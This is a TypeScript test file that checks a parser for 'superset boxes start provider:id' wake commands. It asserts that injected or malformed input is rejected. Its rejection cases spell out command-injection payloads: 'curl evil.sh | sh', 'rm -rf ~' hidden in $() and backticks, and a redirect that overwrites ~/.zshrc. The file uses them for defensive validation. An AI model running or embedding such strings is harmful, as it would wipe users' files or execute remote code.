import { describe, expect, test } from "bun:test";
import { parseBoxWakeCommand } from "./parseBoxWakeCommand";

describe("parseBoxWakeCommand", () => {
	test("reads the wake command each provider's box carries", () => {
		expect(
			parseBoxWakeCommand(
				"superset boxes start daytona:4f6c1b2a-90de-4e1b-8c3a-0a1b2c3d4e5f",
			),
		).toEqual({
			provider: "daytona",
			id: "4f6c1b2a-90de-4e1b-8c3a-0a1b2c3d4e5f",
			ref: "daytona:4f6c1b2a-90de-4e1b-8c3a-0a1b2c3d4e5f",
		});
		expect(parseBoxWakeCommand("superset boxes start e2b:ix7k2m9q")).toEqual({
			provider: "e2b",
			id: "ix7k2m9q",
			ref: "e2b:ix7k2m9q",
		});
		expect(
			parseBoxWakeCommand("superset boxes start blaxel:box_1.prod-eu"),
		).toEqual({
			provider: "blaxel",
			id: "box_1.prod-eu",
			ref: "blaxel:box_1.prod-eu",
		});
	});

	test("refuses anything that is not a host without a box", () => {
		expect(parseBoxWakeCommand(null)).toBeNull();
		expect(parseBoxWakeCommand(undefined)).toBeNull();
		expect(parseBoxWakeCommand("")).toBeNull();
	});

	test("refuses shell syntax after the box", () => {
		for (const hostile of [
			"superset boxes start daytona:x; rm -rf ~",
			"superset boxes start daytona:x && curl evil.sh | sh",
			"superset boxes start daytona:x | sh",
			"superset boxes start daytona:x\nrm -rf ~",
			"superset boxes start daytona:x\n",
			"superset boxes start daytona:$(rm -rf ~)",
			"superset boxes start daytona:`rm -rf ~`",
			"superset boxes start daytona:x' ; rm -rf ~ '",
			'superset boxes start daytona:"x"',
			"superset boxes start daytona:x > ~/.zshrc",
			"superset boxes start daytona:~",
			"superset boxes start daytona:x#",
		]) {
			expect(parseBoxWakeCommand(hostile)).toBeNull();
		}
	});

	test("refuses extra whitespace and extra arguments", () => {
		for (const spaced of [
			" superset boxes start daytona:x",
			"superset boxes start daytona:x ",
			"superset  boxes start daytona:x",
			"superset boxes  start daytona:x",
			"superset boxes start  daytona:x",
			"superset\tboxes start daytona:x",
			"superset boxes start daytona: x",
			"superset boxes start daytona :x",
			"superset boxes start daytona:x --org other",
			"superset boxes start daytona:x y",
		]) {
			expect(parseBoxWakeCommand(spaced)).toBeNull();
		}
	});

	test("refuses other commands, providers and malformed refs", () => {
		for (const other of [
			"superset boxes stop daytona:x",
			"superset boxes delete daytona:x --yes",
			"superset hosts wake devbox",
			"ssh devbox 'systemctl start paradev'",
			"rm -rf ~",
			"/usr/local/bin/superset boxes start daytona:x",
			"env superset boxes start daytona:x",
			"SUPERSET=1 superset boxes start daytona:x",
			"superset boxes start modal:x",
			"superset boxes start Daytona:x",
			"superset boxes start daytona:",
			"superset boxes start daytona",
			"superset boxes start x",
			"superset boxes start daytona:x:y",
			"superset boxes start daytona:x/../y",
			"superset boxes start",
			"SUPERSET BOXES START DAYTONA:X",
		]) {
			expect(parseBoxWakeCommand(other)).toBeNull();
		}
	});
});
